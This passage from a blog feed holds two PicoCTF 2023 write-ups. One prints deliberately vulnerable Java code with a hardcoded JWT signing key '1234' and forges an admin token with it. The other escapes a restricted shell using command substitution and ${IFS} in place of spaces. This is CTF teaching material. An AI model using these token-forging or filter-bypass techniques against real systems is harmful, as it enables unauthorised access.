</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">│</span>   <span style="color:#960050;background-color:#1e0010">│</span>   <span style="color:#960050;background-color:#1e0010">│</span>                   <span style="color:#960050;background-color:#1e0010">└──</span> validators
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">│</span>   <span style="color:#960050;background-color:#1e0010">│</span>   <span style="color:#960050;background-color:#1e0010">│</span>                       <span style="color:#960050;background-color:#1e0010">├──</span> ImageConstraintValidator<span style="color:#f92672">.</span>java
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">│</span>   <span style="color:#960050;background-color:#1e0010">│</span>   <span style="color:#960050;background-color:#1e0010">│</span>                       <span style="color:#960050;background-color:#1e0010">├──</span> PasswordConstraintValidator<span style="color:#f92672">.</span>java
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">│</span>   <span style="color:#960050;background-color:#1e0010">│</span>   <span style="color:#960050;background-color:#1e0010">│</span>                       <span style="color:#960050;background-color:#1e0010">├──</span> PathConstraintValidator<span style="color:#f92672">.</span>java
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">│</span>   <span style="color:#960050;background-color:#1e0010">│</span>   <span style="color:#960050;background-color:#1e0010">│</span>                       <span style="color:#960050;background-color:#1e0010">├──</span> PdfConstraintValidator<span style="color:#f92672">.</span>java
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">│</span>   <span style="color:#960050;background-color:#1e0010">│</span>   <span style="color:#960050;background-color:#1e0010">│</span>                       <span style="color:#960050;background-color:#1e0010">├──</span> ValidImage<span style="color:#f92672">.</span>java
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">│</span>   <span style="color:#960050;background-color:#1e0010">│</span>   <span style="color:#960050;background-color:#1e0010">│</span>                       <span style="color:#960050;background-color:#1e0010">├──</span> ValidPassword<span style="color:#f92672">.</span>java
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">│</span>   <span style="color:#960050;background-color:#1e0010">│</span>   <span style="color:#960050;background-color:#1e0010">│</span>                       <span style="color:#960050;background-color:#1e0010">├──</span> ValidPath<span style="color:#f92672">.</span>java
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">│</span>   <span style="color:#960050;background-color:#1e0010">│</span>   <span style="color:#960050;background-color:#1e0010">│</span>                       <span style="color:#960050;background-color:#1e0010">└──</span> ValidPdf<span style="color:#f92672">.</span>java
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">│</span>   <span style="color:#960050;background-color:#1e0010">│</span>   <span style="color:#960050;background-color:#1e0010">└──</span> resources
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">│</span>   <span style="color:#960050;background-color:#1e0010">│</span>       <span style="color:#960050;background-color:#1e0010">├──</span> application<span style="color:#f92672">.</span>properties
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">│</span>   <span style="color:#960050;background-color:#1e0010">│</span>       <span style="color:#960050;background-color:#1e0010">├──</span> data<span style="color:#f92672">.</span>sql
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">│</span>   <span style="color:#960050;background-color:#1e0010">│</span>       <span style="color:#960050;background-color:#1e0010">├──</span> public
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">│</span>   <span style="color:#960050;background-color:#1e0010">│</span>       <span style="color:#960050;background-color:#1e0010">│</span>   <span style="color:#960050;background-color:#1e0010">├──</span> <span style="color:#ae81ff">3</span>rdpartylicenses<span style="color:#f92672">.</span>txt
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">│</span>   <span style="color:#960050;background-color:#1e0010">│</span>       <span style="color:#960050;background-color:#1e0010">│</span>   <span style="color:#960050;background-color:#1e0010">├──</span> assets
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">│</span>   <span style="color:#960050;background-color:#1e0010">│</span>       <span style="color:#960050;background-color:#1e0010">│</span>   <span style="color:#960050;background-color:#1e0010">│</span>   <span style="color:#960050;background-color:#1e0010">├──</span> logo<span style="color:#f92672">.</span>png
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">│</span>   <span style="color:#960050;background-color:#1e0010">│</span>       <span style="color:#960050;background-color:#1e0010">│</span>   <span style="color:#960050;background-color:#1e0010">│</span>   <span style="color:#960050;background-color:#1e0010">└──</span> pdf<span style="color:#f92672">.</span>worker<span style="color:#f92672">.</span>es5<span style="color:#f92672">.</span>v2<span style="color:#ae81ff">.5.207</span><span style="color:#f92672">.</span>js
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">│</span>   <span style="color:#960050;background-color:#1e0010">│</span>       <span style="color:#960050;background-color:#1e0010">│</span>   <span style="color:#960050;background-color:#1e0010">├──</span> favicon<span style="color:#f92672">.</span>ico
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">│</span>   <span style="color:#960050;background-color:#1e0010">│</span>       <span style="color:#960050;background-color:#1e0010">│</span>   <span style="color:#960050;background-color:#1e0010">├──</span> index<span style="color:#f92672">.</span>html
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">│</span>   <span style="color:#960050;background-color:#1e0010">│</span>       <span style="color:#960050;background-color:#1e0010">│</span>   <span style="color:#960050;background-color:#1e0010">├──</span> main<span style="color:#f92672">.</span>e4577fe86905373d4f38<span style="color:#f92672">.</span>js
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">│</span>   <span style="color:#960050;background-color:#1e0010">│</span>       <span style="color:#960050;background-color:#1e0010">│</span>   <span style="color:#960050;background-color:#1e0010">├──</span> <span style="color:#f92672">&lt;...&gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">│</span>   <span style="color:#960050;background-color:#1e0010">│</span>       <span style="color:#960050;background-color:#1e0010">│</span>   <span style="color:#960050;background-color:#1e0010">├──</span> runtime<span style="color:#f92672">.</span>acf0dec4155e77772545<span style="color:#f92672">.</span>js
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">│</span>   <span style="color:#960050;background-color:#1e0010">│</span>       <span style="color:#960050;background-color:#1e0010">│</span>   <span style="color:#960050;background-color:#1e0010">└──</span> styles<span style="color:#ae81ff">.8170</span>aebc9f7ad1381e97<span style="color:#f92672">.</span>css
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">│</span>   <span style="color:#960050;background-color:#1e0010">│</span>       <span style="color:#960050;background-color:#1e0010">└──</span> static
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">│</span>   <span style="color:#960050;background-color:#1e0010">│</span>           <span style="color:#960050;background-color:#1e0010">└──</span> error<span style="color:#f92672">.</span>html
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">│</span>   <span style="color:#960050;background-color:#1e0010">└──</span> <span style="color:#f92672">&lt;...&gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">└──</span> <span style="color:#f92672">&lt;...&gt;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">37</span> directories, <span style="color:#ae81ff">109</span> files
</span></span></code></pre></div><p>That&rsquo;s a lot of files, but it seems like the only useful directory here is <code>src/main/java/io/github/nandandesai/pico</code>.</p>
<p>In the <code>security</code> directory, we see two interesting files: <code>JwtService.java</code> and <code>SecretGenerator.java</code>.</p>
<p>Let&rsquo;s take a look at them, first, <code>JwtService.java</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#f92672">package</span> io.github.nandandesai.pico.security;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> com.auth0.jwt.JWT;
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> com.auth0.jwt.JWTVerifier;
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> com.auth0.jwt.algorithms.Algorithm;
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> com.auth0.jwt.exceptions.JWTVerificationException;
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> com.auth0.jwt.interfaces.DecodedJWT;
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> io.github.nandandesai.pico.security.models.JwtUserInfo;
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> org.springframework.beans.factory.annotation.Autowired;
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> org.springframework.stereotype.Service;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.util.Calendar;
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.util.Date;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@Service</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">JwtService</span> {
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">private</span> <span style="color:#66d9ef">final</span> String SECRET_KEY;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">private</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">final</span> String CLAIM_KEY_USER_ID <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;userId&#34;</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">private</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">final</span> String CLAIM_KEY_EMAIL <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;email&#34;</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">private</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">final</span> String CLAIM_KEY_ROLE <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;role&#34;</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">private</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">final</span> String ISSUER <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;bookshelf&#34;</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">@Autowired</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#a6e22e">JwtService</span>(SecretGenerator secretGenerator){
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">SECRET_KEY</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;1234&#34;</span>
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> String <span style="color:#a6e22e">createToken</span>(Integer userId, String email, String role){
</span></span><span style="display:flex;"><span>        Algorithm algorithm <span style="color:#f92672">=</span> Algorithm.<span style="color:#a6e22e">HMAC256</span>(SECRET_KEY);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        Calendar expiration <span style="color:#f92672">=</span> Calendar.<span style="color:#a6e22e">getInstance</span>();
</span></span><span style="display:flex;"><span>        expiration.<span style="color:#a6e22e">add</span>(Calendar.<span style="color:#a6e22e">DATE</span>, 7); <span style="color:#75715e">//expires after 7 days</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> JWT.<span style="color:#a6e22e">create</span>()
</span></span><span style="display:flex;"><span>                .<span style="color:#a6e22e">withIssuer</span>(ISSUER)
</span></span><span style="display:flex;"><span>                .<span style="color:#a6e22e">withIssuedAt</span>(<span style="color:#66d9ef">new</span> Date())
</span></span><span style="display:flex;"><span>                .<span style="color:#a6e22e">withExpiresAt</span>(expiration.<span style="color:#a6e22e">getTime</span>())
</span></span><span style="display:flex;"><span>                .<span style="color:#a6e22e">withClaim</span>(CLAIM_KEY_USER_ID, userId)
</span></span><span style="display:flex;"><span>                .<span style="color:#a6e22e">withClaim</span>(CLAIM_KEY_EMAIL, email)
</span></span><span style="display:flex;"><span>                .<span style="color:#a6e22e">withClaim</span>(CLAIM_KEY_ROLE, role)
</span></span><span style="display:flex;"><span>                .<span style="color:#a6e22e">sign</span>(algorithm);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> JwtUserInfo <span style="color:#a6e22e">decodeToken</span>(String token) <span style="color:#66d9ef">throws</span> JWTVerificationException {
</span></span><span style="display:flex;"><span>        Algorithm algorithm <span style="color:#f92672">=</span> Algorithm.<span style="color:#a6e22e">HMAC256</span>(SECRET_KEY);
</span></span><span style="display:flex;"><span>        JWTVerifier verifier <span style="color:#f92672">=</span> JWT.<span style="color:#a6e22e">require</span>(algorithm)
</span></span><span style="display:flex;"><span>                .<span style="color:#a6e22e">withIssuer</span>(ISSUER)
</span></span><span style="display:flex;"><span>                .<span style="color:#a6e22e">build</span>();
</span></span><span style="display:flex;"><span>        DecodedJWT jwt <span style="color:#f92672">=</span> verifier.<span style="color:#a6e22e">verify</span>(token);
</span></span><span style="display:flex;"><span>        Integer userId <span style="color:#f92672">=</span> jwt.<span style="color:#a6e22e">getClaim</span>(CLAIM_KEY_USER_ID).<span style="color:#a6e22e">asInt</span>();
</span></span><span style="display:flex;"><span>        String email <span style="color:#f92672">=</span> jwt.<span style="color:#a6e22e">getClaim</span>(CLAIM_KEY_EMAIL).<span style="color:#a6e22e">asString</span>();
</span></span><span style="display:flex;"><span>        String role <span style="color:#f92672">=</span> jwt.<span style="color:#a6e22e">getClaim</span>(CLAIM_KEY_ROLE).<span style="color:#a6e22e">asString</span>();
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">new</span> JwtUserInfo().<span style="color:#a6e22e">setEmail</span>(email)
</span></span><span style="display:flex;"><span>                .<span style="color:#a6e22e">setRole</span>(role)
</span></span><span style="display:flex;"><span>                .<span style="color:#a6e22e">setUserId</span>(userId);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>One line is especially important:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#a6e22e">JwtService</span>(SecretGenerator secretGenerator){
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">SECRET_KEY</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;1234&#34;</span>
</span></span><span style="display:flex;"><span>    }
</span></span></code></pre></div><p>This is the <em>key</em> used to sign all the generated <code>JWTs</code>, with this, we can create and modify <code>JWT</code> as we want, and thus we can modify our <em>role</em> on the website.</p>
<blockquote>
<p>Strangely the key is also visible in the <code>SecretGenerator.java</code> file:</p></blockquote>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#f92672">package</span> io.github.nandandesai.pico.security;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> io.github.nandandesai.pico.configs.UserDataPaths;
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> io.github.nandandesai.pico.utils.FileOperation;
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> org.slf4j.Logger;
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> org.slf4j.LoggerFactory;
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> org.springframework.beans.factory.annotation.Autowired;
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> org.springframework.stereotype.Service;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.io.IOException;
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.nio.charset.Charset;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@Service</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">SecretGenerator</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">private</span> Logger logger <span style="color:#f92672">=</span> LoggerFactory.<span style="color:#a6e22e">getLogger</span>(SecretGenerator.<span style="color:#a6e22e">class</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">private</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">final</span> String SERVER_SECRET_FILENAME <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;server_secret.txt&#34;</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">@Autowired</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">private</span> UserDataPaths userDataPaths;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">private</span> String <span style="color:#a6e22e">generateRandomString</span>(<span style="color:#66d9ef">int</span> len) {
</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// not so random</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;1234&#34;</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    String <span style="color:#a6e22e">getServerSecret</span>() {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">try</span> {
</span></span><span style="display:flex;"><span>            String secret <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> String(FileOperation.<span style="color:#a6e22e">readFile</span>(userDataPaths.<span style="color:#a6e22e">getCurrentJarPath</span>(), SERVER_SECRET_FILENAME), Charset.<span style="color:#a6e22e">defaultCharset</span>());
</span></span><span style="display:flex;"><span>            logger.<span style="color:#a6e22e">info</span>(<span style="color:#e6db74">&#34;Server secret successfully read from the filesystem. Using the same for this runtime.&#34;</span>);
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> secret;
</span></span><span style="display:flex;"><span>        }<span style="color:#66d9ef">catch</span> (IOException e){
</span></span><span style="display:flex;"><span>            logger.<span style="color:#a6e22e">info</span>(SERVER_SECRET_FILENAME<span style="color:#f92672">+</span><span style="color:#e6db74">&#34; file doesn&#39;t exists or something went wrong in reading that file. Generating a new secret for the server.&#34;</span>);
</span></span><span style="display:flex;"><span>            String newSecret <span style="color:#f92672">=</span> generateRandomString(32);
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">try</span> {
</span></span><span style="display:flex;"><span>                FileOperation.<span style="color:#a6e22e">writeFile</span>(userDataPaths.<span style="color:#a6e22e">getCurrentJarPath</span>(), SERVER_SECRET_FILENAME, newSecret.<span style="color:#a6e22e">getBytes</span>());
</span></span><span style="display:flex;"><span>            } <span style="color:#66d9ef">catch</span> (IOException ex) {
</span></span><span style="display:flex;"><span>                ex.<span style="color:#a6e22e">printStackTrace</span>();
</span></span><span style="display:flex;"><span>            }
</span></span><span style="display:flex;"><span>            logger.<span style="color:#a6e22e">info</span>(<span style="color:#e6db74">&#34;Newly generated secret is now written to the filesystem for persistence.&#34;</span>);
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> newSecret;
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>    <span style="color:#66d9ef">private</span> String <span style="color:#a6e22e">generateRandomString</span>(<span style="color:#66d9ef">int</span> len) {
</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// not so random</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;1234&#34;</span>;
</span></span><span style="display:flex;"><span>    }
</span></span></code></pre></div><p>Now that we have the key, we can modify our <em>token</em> with the <em>admin</em> role and sign it with the key <em>1234</em>.</p>
<blockquote>
<p>Be careful, you should also change the <code>userId</code> field to <code>0</code> since the admin&rsquo;s <code>userId</code> is not <code>1</code></p></blockquote>
<p><img src="https://user-images.githubusercontent.com/77807503/228906908-84ac83e7-d690-400b-b8ba-f7d4d46cdf79.png" alt="2023-03-30-183618_1194x787_scrot"></p>
<p>We can now copy the new token and modify the <code>auth-token</code> key value with it, then refresh the page and we should be <em>admin</em> !</p>
<p><img src="https://user-images.githubusercontent.com/77807503/228906936-fbc5429e-c1f9-484f-890e-db4b317461fc.png" alt="2023-03-30-183151_1877x668_scrot"></p>
<p>It seems like it worked, because the <strong>Admin Dashboard</strong> looks different, we can now modify users.</p>
<p>Let&rsquo;s try to read the <em>Flag book</em> !</p>
<p><img src="https://user-images.githubusercontent.com/77807503/228906964-b40231fb-b6e4-493b-95c5-ff6fc4b50f32.png" alt="2023-03-30-183235_279x65_scrot"></p>
<p>Whaaat? Why?</p>
<p>I don&rsquo;t know, but we can try to modify the &ldquo;<em>User</em>&rdquo; user&rsquo;s permissions to <em>Admin</em> and see if <em>he</em> can read the book:</p>
<p><img src="https://user-images.githubusercontent.com/77807503/228907040-d44ddbe1-6cb4-44ca-9f1b-03211b5dc33f.png" alt="2023-03-30-183347_1360x353_scrot"></p>
<p><img src="https://user-images.githubusercontent.com/77807503/228907066-4cac6dc5-4bae-4a68-b1c3-289fc53b3c25.png" alt="2023-03-30-183501_306x65_scrot"></p>
<p>Now we can clear our <em>Local Storage</em> so the <em>JWT</em> we created gets refreshed and we should be able to read the <em>Flag</em>&hellip;</p>
<p><img src="https://user-images.githubusercontent.com/77807503/228907160-077c5e8a-ffe7-4dd7-b896-b45a99b56922.png" alt="2023-03-30-183813_1888x1030_scrot"></p>
<p>And it worked ! GGs !</p>
<h2 id="ctf-conclusion">CTF Conclusion</h2>
<p>That writeup will be my last one for this edition of the CTF (because I don&rsquo;t think making a writeup on the other challenges I&rsquo;ve flagged is useful)</p>
<p>This was a very fun CTF - even though I would have enjoyed more <code>pwn</code> challenges :c</p>
<p>Me and my team ended up <strong>404/6924</strong> which is great ! Thanks to all my mates and to the organizers, see you next year !</p>
<p><img src="https://user-images.githubusercontent.com/77807503/228907187-09b35317-6a5f-48f4-9610-ac767af96c5e.png" alt="2023-03-28-201238_1888x1030_scrot"></p>
<p><img src="https://user-images.githubusercontent.com/77807503/228907199-34db4a2f-b1ce-4b8c-a236-d96ea3c14992.png" alt="2023-03-28-201252_1888x1030_scrot"></p>
]]></content>
        </item>
        
        <item>
            <title>🇬🇧 PicoCTF 2023 - misc/special</title>
            <link>/posts/2023/03/picoctf-2023-misc/special/</link>
            <pubDate>Tue, 28 Mar 2023 00:00:00 +0000</pubDate>
            
            <guid>/posts/2023/03/picoctf-2023-misc/special/</guid>
            <description>&lt;h2 id=&#34;note&#34;&gt;Note&lt;/h2&gt;
&lt;p&gt;&lt;em&gt;Special&lt;/em&gt; was a very fun challenge from the &lt;em&gt;general skills&lt;/em&gt; category (which is PicoCTF&amp;rsquo;s &lt;em&gt;misc&lt;/em&gt; category).&lt;/p&gt;
&lt;p&gt;I always enjoy bypassing these weird bash filters. It was not different from the previous ones I did, but it was still cool.&lt;/p&gt;
&lt;p&gt;Let&amp;rsquo;s dive into it !&lt;/p&gt;
&lt;h2 id=&#34;description&#34;&gt;Description&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Don&amp;#39;t power users get tired of making spelling mistakes in the shell? 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Not anymore! Enter Special, the Spell Checked Interface for Affecting Linux. 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Now, every word is properly spelled and capitalized... automatically and behind-the-scenes! 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Be the first to test Special in beta, and feel free to tell us all about how Special streamlines every development process that you face. 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;When your co-workers see your amazing shell interface, just tell them: That&amp;#39;s Special (TM) Start your instance to see connection details. 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ssh -p 59874 ctf-player@saturn.picoctf.net
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;The password is ******
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;poking-around&#34;&gt;Poking around&lt;/h2&gt;
&lt;p&gt;We&amp;rsquo;re given a username, a password and a port so we can &lt;code&gt;ssh&lt;/code&gt; to the machine, so let&amp;rsquo;s do it&lt;/p&gt;</description>
            <content type="html"><![CDATA[<h2 id="note">Note</h2>
<p><em>Special</em> was a very fun challenge from the <em>general skills</em> category (which is PicoCTF&rsquo;s <em>misc</em> category).</p>
<p>I always enjoy bypassing these weird bash filters. It was not different from the previous ones I did, but it was still cool.</p>
<p>Let&rsquo;s dive into it !</p>
<h2 id="description">Description</h2>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>Don&#39;t power users get tired of making spelling mistakes in the shell? 
</span></span><span style="display:flex;"><span>Not anymore! Enter Special, the Spell Checked Interface for Affecting Linux. 
</span></span><span style="display:flex;"><span>Now, every word is properly spelled and capitalized... automatically and behind-the-scenes! 
</span></span><span style="display:flex;"><span>Be the first to test Special in beta, and feel free to tell us all about how Special streamlines every development process that you face. 
</span></span><span style="display:flex;"><span>When your co-workers see your amazing shell interface, just tell them: That&#39;s Special (TM) Start your instance to see connection details. 
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>ssh -p 59874 ctf-player@saturn.picoctf.net
</span></span><span style="display:flex;"><span>The password is ******
</span></span></code></pre></div><h2 id="poking-around">Poking around</h2>
<p>We&rsquo;re given a username, a password and a port so we can <code>ssh</code> to the machine, so let&rsquo;s do it</p>
<p>Once we&rsquo;re connected, the first thing we notice is this:</p>
<p><img src="https://user-images.githubusercontent.com/77807503/228326701-3499cd16-19a3-4251-acb0-81d26b41d09b.png" alt="2023-03-28-192950_150x64_scrot"></p>
<p>Instead of the classic <code>username@hostname:~$</code>, it&rsquo;s written <code>Special$</code>. That indicates that we&rsquo;re not on a <em>typical</em> bash shell.</p>
<p>Let&rsquo;s start poking around to see what we <em>can</em> and <em>can&rsquo;t</em> do. We&rsquo;ll start by trying <code>whoami</code>, <code>pwd</code> and <code>ls</code>:</p>
<p><img src="https://user-images.githubusercontent.com/77807503/228326731-0db2b74c-d35c-4dc5-be54-eb2424d8e161.png" alt="2023-03-28-193349_239x233_scrot"></p>
<p>As you can see, there is some kind of spell checker that prevents us from executing commands (<em>pwd</em> becomes <em>Pod</em>, <em>whoami</em> becomes <em>Whom</em> etc&hellip;).</p>
<h2 id="bypassing-the-filter">Bypassing the filter</h2>
<p>Let&rsquo;s try executing <code>ls</code> again but inside of a <a href="https://blog.wplauncher.com/what-is-in-linux/">command substitution</a>:</p>
<p><img src="https://user-images.githubusercontent.com/77807503/228326750-58da2eb2-e9c2-4559-a124-d76aacd1f6a3.png" alt="2023-03-28-193630_257x73_scrot"></p>
<p>This time, it says that <em>blargh</em> wasn&rsquo;t found&hellip; weird, did our <em>ls</em> become <em>blargh</em> ?</p>
<p>No, since <em>command subsitution</em> returns the output of the command, <em>blargh</em> is actually the first folder returned by the <code>ls</code>.</p>
<p>Alright, the next step is knowing what&rsquo;s inside of it, let&rsquo;s try the same trick:</p>
<p><img src="https://user-images.githubusercontent.com/77807503/228326794-39c25852-928b-4f33-b556-b39add3f7033.png" alt="2023-03-28-193844_370x70_scrot"></p>
<p>And that didn&rsquo;t work&hellip; It seems that the space messed up the command, but hopefully there is a trick to avoid putting spaces in the command: <a href="https://www.oreilly.com/library/view/learning-linux-shell/9781785286216/ch08s13.html">The IFS environment variable</a></p>
<p>Let&rsquo;s see if it works when we replace our space by <code>$IFS</code>:</p>
<blockquote>
<p>To prevent the variable from becoming <code>$IFSblargh</code> when we call it, we can <a href="https://stackoverflow.com/questions/27472540/difference-between-and-in-bash">put it in brackets</a></p></blockquote>
<p><img src="https://user-images.githubusercontent.com/77807503/228326832-c4a3346f-3e57-4c50-b9c7-9c8d05feee44.png" alt="2023-03-28-194235_278x69_scrot"></p>
<p>Alright, it worked and we now know where the flag is !</p>
<p>The last step is reading the content of <code>flag.txt</code>, which shouldn&rsquo;t be a problem since we now know how to avoid using spaces:</p>
<p><img src="https://user-images.githubusercontent.com/77807503/228326865-b18d1a81-3200-49da-bec4-bf8cd58b27b0.png" alt="2023-03-28-194430_611x77_scrot"></p>
<p>And we got it ! GGs</p>
]]></content>
        </item>
        
        <item>
